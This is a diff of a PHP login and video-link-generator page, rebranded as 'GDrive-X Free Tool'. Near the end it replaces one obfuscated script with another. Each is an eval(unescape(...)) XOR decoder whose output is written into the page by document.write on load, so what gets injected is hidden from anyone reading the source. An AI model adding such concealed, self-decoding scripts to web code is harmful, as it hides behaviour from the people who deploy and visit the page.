@@ -47,7 +47,7 @@ function display_login_form()
 <head>
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Login Form</title>
+<title>Login Form - GDrive-X Free Tool</title>
 <link rel="icon" href="https://cdn.staticaly.com/gh/domkiddie/drive/master/assets/img/favicon.png">
 <meta name="referrer" content="never" /><meta name="referrer" content="no-referrer" />
 <link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com' /><link rel='dns-prefetch' href='//lh3.googleusercontent.com' /><link rel='preconnect' href='//maxcdn.bootstrapcdn.com' />
@@ -81,10 +81,10 @@ function logged_in_msg($username)
 <meta charset="utf-8">
 <meta http-equiv="X-UA-Compatible" content="IE=edge">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Google Photos Player</title>
-<link rel="icon" href="https://cdn.staticaly.com/gh/domkiddie/drive/master/assets/img/favicon.png">
+<title>GDrive-X Free Tool</title>
+<link rel="icon" href="assets/favicon.png">
 <meta name="referrer" content="never" /><meta name="referrer" content="no-referrer" />
-<link rel='dns-prefetch' href='//cdn.jsdelivr.net' /><link rel='dns-prefetch' href='//lh3.googleusercontent.com' /><link rel='preconnect' href='//cdn.jsdelivr.net' />
+<link rel='dns-prefetch' href='//maxcdn.bootstrapcdn.com' /><link rel='dns-prefetch' href='//lh3.googleusercontent.com' /><link rel='preconnect' href='//maxcdn.bootstrapcdn.com' />
 	<!-- Latest compiled and minified CSS -->
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css" integrity="sha384-BVYiiSIFeK1dGmJRAkycuHAHRg32OmUcww7on3RYdg4Va+PmSTsz/K68vbdEjh4u" crossorigin="anonymous">
 <!-- Optional theme -->
@@ -92,20 +92,19 @@ function logged_in_msg($username)
 <script src="https://ajax.googleapis.com/ajax/libs/jquery/1.11.3/jquery.min.js"></script>
 </head>
 <body>
-    <br />
-<div class="container" style="width:80%">
+<div class="container" style="width:80%"><br />
 <div class="row">
 <div class="col-md-12">
 <div class="panel panel-primary">
 <div class="panel-heading">
-<h3 class="panel-title">Google Photos Player</h3>
+<h3 class="panel-title">GDrive-X Free Tool. To purchase GDrive-X Premium Tool, mail here: 2105karankankaria [@] gmail [dot] com</h3>
 <p> <?php echo '<p>Welcome back <b>' . $username . '</b>. You have successfully logged in!</p>';?> </p>
 <p class="lead"><a class="btn btn-info btn-sm" href="?logout=true" role="button">Log Out</a></p>
 </div>
 <div class="panel-body">
 <div class="row">
 <div class="col-md-8 col-md-offset-2">
-<?php if($var_c777f9f5bb1d443e6840a6bc0fd59608){echo 'Video Preview:<br><iframe src="'.$var_ceb5e88c3ba3c575619c09d05c245af1.'embed.php?url='.$var_c777f9f5bb1d443e6840a6bc0fd59608.'&sub='.$var_6f0761f10142d0b2cca27f076f813d07.'&poster='.$var_65bee03a17c74134539f222cb38f0cae.'" width="100%" height="350px" frameborder="0" scrolling="no" allowfullscreen></iframe>';}?>
+<?php if($var_c777f9f5bb1d443e6840a6bc0fd59608){echo 'Video Preview:<br><br /><iframe src="'.$var_ceb5e88c3ba3c575619c09d05c245af1.'embed.php?url='.$var_c777f9f5bb1d443e6840a6bc0fd59608.'&sub='.$var_6f0761f10142d0b2cca27f076f813d07.'&poster='.$var_65bee03a17c74134539f222cb38f0cae.'" width="100%" height="350px" frameborder="0" scrolling="no" allowfullscreen></iframe>';}?>
 </div>
 </div><br><br>
 <form action="" method="POST" class="form-horizontal">
@@ -129,7 +128,7 @@ function logged_in_msg($username)
 </div>							
 <div class="form-group">
 <div class="col-md-6 col-md-offset-3">
-<button value="GET" name="submit" class="btn btn-info" id="btn-create">GET & WATCH MOVIE</button>
+<button value="GET" name="submit" class="btn btn-info" id="btn-create">GENERATE LINK</button>
 </div>
 </div>
 </form>
@@ -167,9 +166,9 @@ function myFunction() {
 </script>
 <script type="text/javascript">
 <!-- 
-eval(unescape('%66%75%6e%63%74%69%6f%6e%20%77%34%65%65%36%39%32%39%64%62%31%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%32%32%34%34%31%34%32%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%37%34%36%30%30%30%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%35%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
-eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%77%34%65%65%36%39%32%39%64%62%31%28%27') + '%33%1e%28%20%1a%41%60%6d%59%5a%67%1b%6e%60%6d%60%13%6e%5f%65%1c%27%64%6f%5c%62%2d%67%6e%2c%1a%2b%1c%45%6e%6c%62%67%60%1f%3e%69%54%66%77%68%63%5a%68%1b%28%28%3d%0a%05%3f%6f%5d%6a%63%6f%69%1b%5c%6e%70%6b%5e%13%6f%6e%59%3f%19%65%6f%6f%6b%6a%37%2a%22%73%71%75%2e%66%6c%6a%62%67%64%6d%5c%6a%69%5f%6e%5b%66%66%6d%29%5e%6e%6a%2a%6a%6e%5f%65%2d%61%68%3a%64%5f%3c%52%3c%20%2d%31%35%2c%35%29%2f%2d%2c%2c%2f%1d%31%36%29%69%59%69%62%6b%6f%39%0c%07%37%66%5f%6e%63%6c%6b%3f%08%05%1b%1f%70%64%61%5e%69%75%2e%5b%5a%6f%5c%47%58%76%60%65%1a%3b%1c%75%60%6f%5f%6a%72%2d%5d%5c%67%5d%44%5b%73%64%6b%1b%77%77%1f%54%58%3e%09%06%1c%1c%65%76%69%5e%6f%60%68%69%13%63%6c%5b%65%27%22%76%5f%5c%6b%5e%47%54%75%63%6a%2e%6f%76%6e%63%23%58%6f%62%78%69%63%6e%68%6a%22%36%78%08%01%19%1b%6a%6e%5f%65%24%26%63%6e%22%27%1f%6b%60%7a%1a%3c%5b%68%64%25%24%24%36%0c%07%08%0d%1a%18%65%68%58%64%23%22%5e%6e%6b%61%6c%63%21%20%1c%26%56%3c%28%2c%36%30%2b%39%2e%2c%2a%2b%2c%2b%22%24%36%0c%07%37%22%6f%5d%6a%63%6f%69%39%08%05%33%6c%5e%65%65%68%68%1c%6a%6b%5e%38%1d%67%6d%6f%63%6f%36%2d%2d%6c%5a%73%5e%5f%6d%2b%5d%62%6b%6c%69%68%69%5a%6b%5e%5f%6d%2b%5e%62%69%29%5a%6d%6e%69%6e%6f%6d%58%69%2a%27%28%28%2e%2c%2e%63%6e%2a%5d%6e%68%6f%66%6e%6e%5b%6c%2d%6e%64%69%29%61%6c%1d%13%5e%63%66%67%69%3f%37%2a%6e%5a%6f%64%63%6e%3a22441429%34%32%30%38%31%33%37' + unescape('%27%29%29%3b'));
+eval(unescape('%66%75%6e%63%74%69%6f%6e%20%61%64%64%66%36%38%37%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%34%34%37%34%39%37%39%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%38%31%30%30%34%35%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%36%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
+eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%61%64%64%66%36%38%37%28%27') + '%31%18%2e%22%1e%41%63%61%5d%5b%66%1e%68%64%6d%56%1f%6a%5b%64%12%23%61%6e%5f%64%2f%67%64%26%1e%27%1f%49%68%69%61%62%5a%1d%38%61%5e%62%73%6b%6b%5c%6d%1a%23%22%3f%04%0d%33%69%5d%69%6b%6b%6e%1a%5f%68%74%6b%54%1f%69%6c%58%3f%1d%62%6e%6a%6f%6a%37%20%2c%75%71%74%20%60%69%69%65%63%58%6d%52%64%63%5b%6d%53%60%5f%6c%2c%58%6e%64%20%64%6a%5b%64%21%65%6d%39%67%5b%30%4c%32%22%2f%31%34%22%31%2e%2e%28%2e%20%2f%15%3d%32%29%68%55%6d%63%6a%6a%3d%00%07%3f%68%59%6c%66%62%6f%38%07%00%1f%1d%72%6a%6d%5a%69%74%20%5f%5b%6e%5f%43%5c%70%56%69%1e%37%1f%79%62%68%5e%6d%74%2f%5d%52%6b%5f%46%5e%7b%5e%6c%1a%72%73%1d%56%5e%30%03%04%1f%12%61%6f%68%59%6b%64%6a%61%1f%65%6e%5e%69%23%23%75%5a%5e%69%58%4f%5e%77%5f%69%20%6b%6f%6d%66%27%5c%6f%68%6a%63%5f%6d%66%6c%23%35%73%02%03%19%13%64%6a%5b%64%2a%20%64%6d%25%23%1d%6b%56%74%1e%3e%5e%66%5e%22%23%27%30%00%07%0e%01%1e%1a%64%66%5a%61%22%25%58%6e%6b%69%66%65%21%23%12%20%4f%3b%23%2e%36%32%23%35%2a%2e%29%23%26%2c%21%27%30%00%07%3f%2c%69%5d%69%6b%6b%6e%38%03%01%31%6e%54%69%67%6a%6b%12%6c%6c%5d%33%19%65%6d%67%6f%69%34%2c%21%66%5b%72%59%5b%6f%2b%55%6c%6d%6e%68%66%6d%5b%6a%59%5b%6f%2b%54%6c%63%29%59%61%68%6e%6d%6a%69%5c%69%20%2b%2c%2a%2d%22%28%64%6d%2d%59%6e%6a%67%68%6a%6c%5e%62%29%67%63%6c%2d%63%6e%15%3d%32%29%68%55%6d%63%6a%6a%3d%00%07%3f%68%59%6c%66%62%6f%1a%6e%77%6f%58%34%15%6b%5b%72%6b%21%65%5b%70%5f%68%5a%6f%6a%6f%6a%1c%3d%0f%05%70%5b%68%1f%69%6f%7a%38%6d%6f%6d%66%36%2a%35%74%5e%6b%19%6e%66%6c%63%62%53%67%4f%6d%5b%69%4b%5c%64%6f%6d%68%68%57%42%68%47%67%63%64%6e%56%58%6d%68%5b%65%36%2c%2a%2e%30%67%6c%61%58%6a%63%6c%60%1b%5d%62%5b%58%62%21%2a%70%58%5f%65%61%6d%5f%37%6c%5a%76%19%37%5e%6a%5f%27%2b%29%61%5f%6a%4b%64%64%56%27%27%35%5b%57%5d%6f%61%65%5a%6b%36%52%65%6a%5f%69%3f%69%5f%71%1e%3b%5c%6d%56%27%27%28%64%57%6f%4e%63%63%5a%25%20%3c%66%64%22%5e%68%6f%5f%6c%23%59%58%63%60%69%5b%38%62%6b%69%63%67%5f%63%48%6e%56%69%48%5f%68%62%68%68%6d%5b%46%6f%44%6a%63%67%6d%5a%55%68%68%5e%69%26%72%5d%60%58%6b%67%5a%60%6f%28%71%68%66%69%5c%2b%19%1e%3e%6c%60%6f%1a%69%6e%5a%6f%19%37%5a%74%5f%63%61%6b%5f%6c%1e%4b%6e%6a%6f%68%2c%1a%19%2b%34%6d%5f%62%65%2f%65%60%58%5f%6e%66%61%69%28%6c%5b%6f%61%58%54%5a%26%71%66%60%5f%69%71%2c%63%6e%5e%52%6b%67%69%6d%20%6b%6c%69%6a%6c%5a%6a%6f%20%75%63%6d%56%68%71%28%62%6c%5a%58%67%66%6d%68%2d%6a%6d%5f%60%2c%68%68%5f%64%6b%68%63%6d%69%23%71%63%6c%5b%6e%72%21%63%6d%5d%5e%66%62%69%68%2c%6f%6b%6a%67%6c%59%69%63%20%67%5f%68%65%6b%65%20%2a%30%73%5f%63%65%5e%75%5c%5b%65%6e%6f%56%32%6c%6f%63%6e%34%5b%60%6a%5a%6b%34%61%6a%62%66%30%56%5e%66%5f%6a%5a%1d%5f%56%65%6d%6c%5a%3d%5f%5f%66%5b%6b%58%19%52%65%6a%5f%69%3d%76%6d%5f%6a%4b%64%64%56%6c%6b%6e%27%55%63%5f%5d%61%23%2c%29%23%26%31%77%58%6a%5e%5d%65%26%26%32%72%6a%6d%5a%69%74%20%68%68%66%6d%5e%59%34%69%6a%6c%5d%6b%6b%68%68%22%27%70%59%6a%54%6a%63%5f%6d%66%29%5b%5e%5a%3a%77%5c%61%6b%42%63%68%66%5e%68%5f%68%27%1b%5e%60%6d%6a%5f%77%66%66%5f%68%6b%19%21%63%66%6d%59%6e%66%61%69%22%5f%27%70%58%2b%63%69%5b%70%5a%60%6f%3e%5f%64%5e%68%65%67%27%27%35%72%2e%61%5b%66%69%5a%24%36%57%6c%59%6f%62%57%69%6e%28%5f%5b%59%3c%79%5a%6c%6e%43%6b%6c%6e%5f%6c%5a%6b%21%15%60%5b%73%5b%61%70%68%1c%22%65%68%6b%54%6b%67%69%6d%2a%5e%23%75%67%65%25%5c%21%58%6a%6c%63%4d%5e%73%20%24%5a%2f%6e%6b%66%64%6e%40%57%72%20%20%5b%2d%62%5c%7a%38%6d%5e%5a%3f%36%31%2d%27%70%59%60%64%5e%58%66%5a%56%3e%70%5f%6c%6b%25%5c%2a%30%73%07%01%6b%61%22%5f%2c%58%69%6f%6f%40%5b%73%25%28%5e%28%6d%66%66%67%6d%4c%5a%77%20%25%57%29%65%5f%77%38%6e%5d%56%32%33%31%2b%2b%74%5e%63%69%5e%5b%65%56%5b%3b%70%5a%60%6f%22%5f%27%30%70%04%0d%66%64%22%5a%20%64%5f%73%39%6c%59%5c%3e%32%36%2d%25%28%23%68%5b%74%66%66%58%67%6c%68%28%6f%6e%5a%6e%60%6d%69%60%2b%6e%5e%6a%5d%67%2a%1d%47%5b%59%19%24%3a%56%2d%63%5f%6b%53%44%5f%73%30%5a%2f%5e%67%69%62%45%5a%7b%22%23%75%5a%66%6a%58%55%63%5b%5e%3a%78%5e%68%6e%26%5a%24%36%7e%02%00%63%65%2a%5e%28%5d%6a%69%61%46%56%76%24%20%5a%20%64%5f%73%39%6c%59%5c%3e%32%36%2f%26%7d%5f%63%6d%5f%59%61%5c%57%3a%74%5f%6d%66%23%5f%23%31%72%00%07%6a%65%26%5f%75%57%69%6e%28%61%5a%74%3e%60%5b%5b%37%32%23%2d%2d%23%71%5b%64%6e%52%59%62%5f%5b%37%71%5f%68%6a%27%58%20%3c%72%73%26%65%53%67%6d%5f%27%30%67%6c%61%58%6a%63%6c%60%1b%5e%63%69%5e%5b%65%56%5b%3b%70%5a%60%6f%22%5f%27%70%64%63%2b%5a%2c%6d%6b%61%6b%4a%6c%6d%6f%5c%62%52%6b%67%69%6d%2b%74%5f%28%69%6b%6e%69%43%69%6d%6a%5e%69%5a%6e%63%6d%6d%25%20%3c%72%5b%66%68%57%1b%63%60%26%74%64%6b%57%6c%75%28%5a%78%5e%68%6e%27%70%76%60%61%5b%6d%71%2d%57%71%5f%68%6a%2d%5a%58%61%58%5b%66%39%67%5d%5c%66%5b%32%69%6f%66%5a%31%77%5a%20%6b%6c%5f%74%5a%6f%6d%37%5a%64%5b%6a%6e%6f%22%23%31%69%58%6d%66%69%6c%1a%65%53%67%6d%5f%31%72%70%36%0e%01%32%29%68%55%6d%63%6a%6a%3d14474979%37%33%39%35%34%30%35' + unescape('%27%29%29%3b'));
 // -->
 </script>
-<noscript><i>Javascript required</i></noscript></body>
+<noscript><i>Javascript required</i></noscript>
 </html>
